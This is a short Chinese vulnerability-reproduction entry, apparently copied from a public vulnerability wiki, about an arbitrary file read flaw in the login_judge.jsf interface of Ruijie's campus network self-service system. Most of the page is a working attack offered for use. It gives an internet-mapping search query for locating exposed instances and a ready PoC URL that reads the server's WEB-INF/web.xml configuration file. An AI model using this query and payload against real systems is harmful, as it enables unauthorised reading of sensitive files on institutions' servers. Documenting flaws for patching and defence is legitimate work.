---
title: "锐捷 校园网自助服务系统 login_judge.jsf 任意文件读取漏洞"
date: 2026-10-18 09:17:08
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "锐捷"
tags:
  - "锐捷"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

锐捷 校园网自助服务系统 login_judge.jsf 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 漏洞影响

锐捷 校园网自助服务系统

## 网络测绘

```
body="校园网自助服务系统"
```

## 漏洞复现

登陆页面

![image-20231116142459917](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231116142459917.png)

poc

```
/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F
```

![image-20231116142521368](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231116142521368.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
